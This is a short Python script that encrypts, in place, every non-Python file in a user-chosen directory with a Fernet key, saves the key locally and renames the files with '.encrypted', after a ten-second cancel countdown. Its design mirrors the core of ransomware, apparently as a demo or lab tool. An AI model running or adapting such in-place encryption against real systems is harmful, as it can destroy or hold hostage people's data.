import os
import socket 
import time 
import sys 
from cryptography.fernet import Fernet

def get_directory_path():
    directory_path = input("Enter the directory path to encrypt: ")
    
    if os.path.exists(directory_path):

        normalized_path = os.path.normpath(directory_path)
        return normalized_path
    else:
        print("Directory not found, please try again.")
        return get_directory_path()



def check_safety():

    current_hostname=socket.gethostname()

    try:
        print("it will start in 10 seconds you have 10 seconds to save your files break with ctrl+c")
        for i in range (10,0,-1):
            print(f"{i} seconds remaining")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
        sys.exit()



def generate_and_save_key():
    encrypted_key=Fernet.generate_key()
    with open("encrypted_key.key","wb") as key_file:
        key_file.write(encrypted_key)

    return encrypted_key


def discover_files(directory_path):
    discovered_files=[]
    for item in os.listdir(directory_path):

        full_path=os.path.join(directory_path,item)

        if os.path.isfile(full_path):
            
            if item=="encrypted_key.key" or item.endswith(".py"):

                continue
            discovered_files.append(full_path)

    return discovered_files


def encrypt_files(file_list, key):

    cipher=Fernet(key)

    for file_path in file_list:
        with open(file_path,"rb") as original_file:
            file_data=original_file.read()

        encrypted_data=cipher.encrypt(file_data)

        with open(file_path,"wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

        new_path=file_path+".encrypted"
        os.rename(file_path,new_path)
        
        print(f"encrypted {new_path}")



def main():

    directory_path=get_directory_path()
    
    check_safety()

    key = generate_and_save_key()

    targets = discover_files(directory_path)

    if targets:
        print(f"Found {len(targets)} files. Starting encryption...")
        encrypt_files(targets, key)
        print("\nSUCCESS: All target files are now encrypted.")
    else:
        print("No target files found in the directory.")



if __name__ == "__main__":
    main()
